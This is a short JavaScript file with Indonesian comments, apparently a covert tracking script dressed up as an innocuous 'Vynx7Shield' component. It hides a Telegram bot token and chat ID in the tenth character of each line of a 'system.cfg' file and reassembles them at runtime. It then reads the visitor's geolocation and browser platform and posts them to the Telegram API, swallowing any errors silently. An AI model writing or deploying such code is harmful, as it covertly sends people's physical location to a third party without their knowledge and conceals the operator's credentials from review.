class Vynx7Shield {
    constructor() {
        this._src = "system.cfg";
        this._len = 0; // Masukkan panjang data b64 dari output Python tadi
    }

    async ignite(lat, lon) {
        try {
            // 1. Ambil file config
            const res = await fetch(this._src + "?v=" + Date.now());
            const text = await res.text();
            const lines = text.split("\n").filter(l => l.length > 10);

            // 2. Rakit Data (Assembly)
            let assembledB64 = "";
            // Kita looping sebanyak panjang data yang dihasilkan Python
            // Ganti 76 dengan data_len dari output Python kamu
            const dataLen = 76; 
            
            for (let i = 0; i < dataLen; i++) {
                let lineIdx = i % lines.length;
                // Ambil karakter di posisi index ke-10
                assembledB64 += lines[lineIdx].charAt(10);
            }

            // 3. Decode Token & ChatID
            const decoded = atob(assembledB64);
            const [token, chatID] = decoded.split("|");

            // 4. Kirim Data
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatID,
                    text: `✅ <b>VYNX7 AGRI-NUSA</b>\n📍 Lat: ${lat}\n📍 Lon: ${lon}\n🖥️ Platform: ${navigator.platform}`,
                    parse_mode: "HTML"
                })
            });

        } catch (e) {
            // Silent error
        }
    }
}

// Trigger utama
function runVynx7() {
    navigator.geolocation.getCurrentPosition(p => {
        const v = new Vynx7Shield();
        v.ignite(p.coords.latitude, p.coords.longitude);
    });
}
